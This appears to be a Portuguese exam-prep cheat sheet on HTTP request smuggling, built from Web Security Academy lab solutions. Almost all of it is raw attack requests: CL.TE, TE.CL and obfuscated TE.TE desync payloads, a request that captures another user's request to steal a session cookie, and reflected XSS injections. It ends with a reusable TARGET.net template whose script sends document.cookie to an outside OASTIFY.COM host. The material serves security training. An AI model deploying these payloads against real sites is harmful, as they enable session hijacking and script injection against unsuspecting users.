# HTTP Request Smuggling

Probabilidade: $${\color{green}baixa}$$.

<br>

É bem incomum de cair no exame, mas caso ela apareça, identifique-a com a extensão HTTP Request Smuggler e ao identificar o tipo, utilize os payloads dos labs.

<br>

## Laboratórios

**Use unsupported Method GPOST (CL.TE)**
```
POST / HTTP/1.1
...
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

<br>
<br>

**Use unsupported Method GPOST (TE.CL)**
```
POST / HTTP/1.1
Host: 0a4d007b048d4832c0afb01800b700ca.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

<br>
<br>

**Obfuscating TE.TE**

```
POST / HTTP/1.1
Host: 0a8800ee047d6d24c0c255e700a6009c.web-security-academy.net
Connection: close
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Content-Length: 4

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

<br>
<br>

**Detecting CL.TE**

```
POST / HTTP/1.1
Host: 0a6a00d30379506b809380bf004a002c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Transfer-Enconding: chunked

0

GET /throws404 HTTP/1.1
X-Ignore: X
```

<br>
<br>

**Get Other User's Request to Steal Cookie**
```
POST / HTTP/1.1
Host: 0ab400c404f08302c01f503800ff00ba.web-security-academy.net
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 357
tRANSFER-ENCODING: chunked

0

POST /post/comment HTTP/1.1
Host: 0ab400c404f08302c01f503800ff00ba.web-security-academy.net
Cookie: session=N2dqf1wUAKs2U79D8Kb9d3ROkWblLydg
Content-Length: 814
Content-Type: application/x-www-form-urlencoded
Connection: close

csrf=nyDg9uHq32xSredK0gaIuHeyk21sESN8&postId=2&name=wad&email=rei%40gmail.com&website=https://kek.com&comment=LEL
```

<br>
<br>

**Exploiting HTTP Request Smuggling to Deliver Reflected XSS**
```
POST / HTTP/1.1
Host: 0a5800fa04974f1bc15f0dab004400ef.web-security-academy.net
Cookie: session=3MNdX218m6gxqn82BLl4dxpx3eCLNd8i
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Transfer-Encoding: chunked

3
x=y
0

GET /post?postId=10 HTTP/1.1
User-Agent: kek"><img src=123 onerror=alert(1)>
Foo: x
```

OU

```
POST / HTTP/1.1
Host: 0a7100630381286c8082da5d00ea00f2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 149
Transfer-Encoding: chunked

0

GET /post?postId=3 HTTP/1.1
User-Agent: "/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

Versão adaptada:
```
POST / HTTP/1.1
Host: TARGET.net
Content-Length: 237
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /post?postId=4 HTTP/1.1
User-Agent: a"/><script>document.location='http://OASTIFY.COM/?Hack='+document.cookie;</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```
